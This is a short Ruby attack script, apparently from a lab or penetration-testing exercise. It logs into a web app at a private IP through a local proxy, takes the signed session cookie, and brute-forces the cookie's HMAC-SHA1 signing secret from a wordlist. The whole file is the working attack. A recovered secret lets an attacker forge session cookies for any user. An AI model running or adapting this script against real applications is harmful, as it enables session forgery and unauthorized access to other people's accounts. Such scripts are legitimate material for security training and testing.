require "net/http"
require "uri"
require "pp"
require "openssl"

# Reote host
URL = "http://192.168.88.193/login"

# Create URL
url = URI.parse(URL)

# Proxy config
PROXY = "127.0.0.1"
PROXY_PORT = "8080"

creds = "test"

# Auth
resp = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(url.host, url.port) do |http|
	http.post(url.request_uri, "login=#{creds}&password=#{creds}")
end

# Get the cookie
c = resp.header['Set-Cookie'].split("=")[1].split("; ")[0]
cookie, signature = c.split("--")

def sign(data,secret)
	OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end

cookie = URI.decode(cookie)

File.readlines(ARGV[0]).each do |c|
	c.chomp!
	if sign(cookie, c) == signature
		puts "Secret found: " + c
		exit
	end
end

